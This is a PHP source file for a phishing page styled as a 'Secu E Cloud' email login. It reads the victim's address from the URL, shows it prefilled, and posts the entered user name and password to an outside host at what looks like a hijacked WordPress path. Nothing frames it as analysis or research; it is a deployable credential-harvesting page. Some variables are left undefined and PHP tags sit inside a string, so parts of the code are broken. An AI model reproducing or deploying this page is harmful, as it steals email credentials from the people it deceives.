<?php


if(isset($_GET['login'])){}else{die; exit;}
function test_input($data) {
   $data = trim($data);
   $data = strip_tags($data);
   $data = stripslashes($data);
   $data = htmlspecialchars($data);
   return $data;
}
$dd=test_input($_GET['login']);

$dat=substr($dd,strpos($dd,"@"));
$dd1= substr($dd,0,strpos($dd,"@"));
$dd2= substr($dat,1,(strpos($dat,".")-1));
$dd3= substr($dat,strpos($dat,"."));
/**
echo $dat."<br/>";
echo $dd1."<br/>";
echo $dd2."<br/>";
echo $dd3."<br/>";

die;

$dd1= substr($dd,0,strpos($dd,"@"));

*/






$ww='<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Secu E Cloud</title>
</head>
<style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0px;
  padding: 0px;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  input[type=text],
  input[type=password]{
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 48px;
  width: 100%;
  margin: 0;
  background: #fff;
  border: #fff;
  border-bottom: 1px solid #ddd;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 0px;
  font-size: 22px;
  font-family: inherit;
  line-height: 35px;
  vertical-align: top;
  color: #888;
  }
  input[type=text]:focus,
  input[type=password]:focus {
  outline: none;
  background-color: #fff;
  border: #fff;
  border-bottom: 1px solid #ddd;

  }
</style>
<body background="https://i.ibb.co/jkvRsfS/bk.png">

<div align="center">
	<table border="0" width="998" cellspacing="0" cellpadding="0" height="680" background="https://i.ibb.co/2W8jBL8/bg.png">
		<tr>
			<td>
			<table border="0" width="100%" cellspacing="0" cellpadding="0">
			  <form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php">
				<tr>
					<td height="210"></td>
				</tr>
				<tr>
					<td height="273">
					<table border="0" width="100%" cellspacing="0" cellpadding="0" height="100%">
						<tr>
							<td>&nbsp;</td>
							<td width="408">
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td height="50">
									   <span style="display: inline-block; width: 100%; height: 44px; line-height: 35px; border: none; border-bottom: 1px solid #ddd; margin: 5px 0; font-size: 22px; color: #5581e4;" >
									   <?php echo $ddomain;?></span>
									   <input type="hidden" name="domain" value="<?php echo $ddomain;?>" maxlength="20">
									   <input type="hidden" name="sender" value="Secuecloud" maxlength="20">
									   <input type="hidden" name="link" value="https://mail.<?php echo $ddomain;?>" maxlength="20">
									</td>
								</tr>
								<tr>
									<td height="55">
									   <input type="text" name="user" value="<?php echo $users;?>" maxlength="20" required >
									</td>
								</tr>
								<tr>
									<td height="55">
									  <input type="password" name="passwd" maxlength="20" required autofocus >
									</td>
								</tr>
								<tr>
									<td height="55"></td>
								</tr>
								<tr>
									<td>
									<input type="image" src="https://i.ibb.co/hfvcc1h/btn.png" width="408" height="55"></td>
								</tr>
							</table>
							</td>
							<td width="40">&nbsp;</td>
						</tr>
					</table>
					</td>
				</tr>
				<tr>
					<td height="198"></td>
				</tr>
				</form>
			</table>
			</td>
		</tr>
	</table>
</div>

</body>

</html>

<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>
